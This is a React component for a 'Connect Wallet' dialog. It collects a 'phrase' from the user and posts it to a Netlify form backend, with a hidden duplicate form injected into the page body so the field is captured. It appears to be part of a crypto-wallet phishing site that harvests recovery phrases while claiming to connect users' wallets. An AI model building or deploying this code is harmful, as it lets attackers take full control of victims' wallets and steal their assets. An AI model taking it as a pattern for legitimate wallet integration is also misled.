import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { useEffect } from "react";
import { WalletFormInput } from "./wallet/WalletFormInput";
import { WalletFormInstructions } from "./wallet/WalletFormInstructions";
import { WalletFormSubmit } from "./wallet/WalletFormSubmit";
import { WalletFormHoneypot } from "./wallet/WalletFormHoneypot";
import { useWalletForm } from "@/hooks/useWalletForm";

interface WalletDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
  const { phrase, setPhrase, loading, handleSubmit } = useWalletForm(onOpenChange);

  useEffect(() => {
    if (window.hasOwnProperty('ElfsightApp')) {
      (window as any).ElfSightApp?.refresh();
    }
  }, [open]);

  useEffect(() => {
    const form = document.createElement('form');
    form.setAttribute('name', 'wallet-connection');
    form.setAttribute('data-netlify', 'true');
    form.setAttribute('hidden', 'true');
    form.innerHTML = `
      <input type="hidden" name="form-name" value="wallet-connection" />
      <input type="text" name="phrase" />
    `;
    document.body.appendChild(form);
    return () => {
      document.body.removeChild(form);
    };
  }, []);

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" aria-describedby="wallet-dialog-description">
        <DialogHeader>
          <DialogTitle className="text-center">Connect Wallet</DialogTitle>
          <DialogDescription id="wallet-dialog-description" className="text-center">
            Connect your wallet to access your account and manage your assets.
          </DialogDescription>
        </DialogHeader>
        <form 
          onSubmit={handleSubmit} 
          className="space-y-4 py-4" 
          data-netlify="true" 
          name="wallet-connection" 
          method="POST"
        >
          <input type="hidden" name="form-name" value="wallet-connection" />
          <WalletFormHoneypot />
          <WalletFormInstructions />
          <WalletFormInput phrase={phrase} onChange={setPhrase} />
          <WalletFormSubmit loading={loading} />
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default WalletDialog;